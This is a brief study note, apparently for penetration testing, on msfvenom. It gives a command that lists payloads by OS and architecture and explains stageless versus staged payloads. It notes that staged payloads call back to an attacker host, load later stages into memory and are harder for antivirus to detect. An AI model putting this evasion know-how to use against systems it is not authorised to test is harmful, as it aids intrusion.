MSFVENOM

  msfvenom --list payloads | grep "<OS>/<arch>"

  stageless payload: 
    Self contained, single executable payload file - antivirus will likely notice and flag it
    as the entire payload is saved to remote host disk.
  staged payload:
    Runs payload in multiple stages, with a somewhat more benign initial stage to connect back 
    to attacker host and download later stages directly into remote host memory. Slightly harder
    to detect.
